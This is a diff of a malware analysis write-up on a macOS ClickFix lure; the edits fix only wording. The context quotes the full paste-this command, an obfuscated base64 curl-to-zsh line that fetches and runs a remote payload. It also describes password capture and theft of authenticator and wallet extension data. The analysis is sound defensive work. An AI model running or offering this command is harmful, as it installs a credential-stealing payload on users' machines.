@@ -4,7 +4,7 @@ ClickFix is a social-engineering technique that relies on convincing users to pe
 
 ## ClickFix Lure
 
-This execution chain starts with the following domain, which is often the target from various malvertising domains:
+This execution chain starts with the following domain, which is often the target of various malvertising campaigns:
 
 Domain: hxxps[://]macfilearchive[.]com/s3/
 
@@ -12,7 +12,7 @@ There is also a recent Reddit post on r/MacOS where a user has fallen victim to 
 
 <img width="1007" height="1069" alt="image" src="https://github.com/user-attachments/assets/dab21879-3c91-4020-9ba8-34872b43d6a5" />
 
-This legitimate looking domain instructs users to copy and paste the command in the code block. At first glance, it seems harmless as it is referencing Apple's legitimate domain, but the full command is as follows:
+This legitimate looking domain instructs users to copy and paste the command in the code block. At first glance, it seems harmless as it references Apple's legitimate domain, but the full command is as follows:
 
 ```bash
 echo "Apple-Installer: https://apps.apple.com/hidenn-gift.application/macOsAppleApicationSetup421415.dmg" && curl -kfsSL $(echo 'aHR0cDovL2JhbGxmcmFuay50b2RheS9jdXJsLzI3MDY1M2Y4NjJmMGVlMjFkY2UwYTQ2ZTQ4MDFlYzI4ZGI0ZGRjNzdiNmZiYTkzNDFiMWI4ZGIyOTkwOWM1MTQ='|base64 -D)|zsh
@@ -709,7 +709,7 @@ end if
   </code></pre>
 </details>
 
-Upon execution, the script prompts the user the enter their password, and will repeatedly ask until the correct password is entered, it will then save the password to disk.
+Upon execution, the script prompts the user to enter their password, and will repeatedly ask until the correct password is entered, it will then save the password to disk.
 
 <img width="429" height="186" alt="image" src="https://github.com/user-attachments/assets/50026e35-301f-4b95-b21e-e97e910a78b6" />
 
@@ -763,7 +763,7 @@ bbphmbmmpomfelajledgdkgclfekilei - Authenticator app
 bnfooenhhgcnhdkdjelgmmkpaemlnoek - Auto 2FA
 ```
 
-Additionally, a large number of extesnions are checked related to crypto-currency wallets.
+Additionally, a large number of extensions are checked related to cryptocurrency wallets.
 
 The malware will copy the data from these extensions, including IndexedDB, Local Extension Settings, cookies, and saved passwords.
 
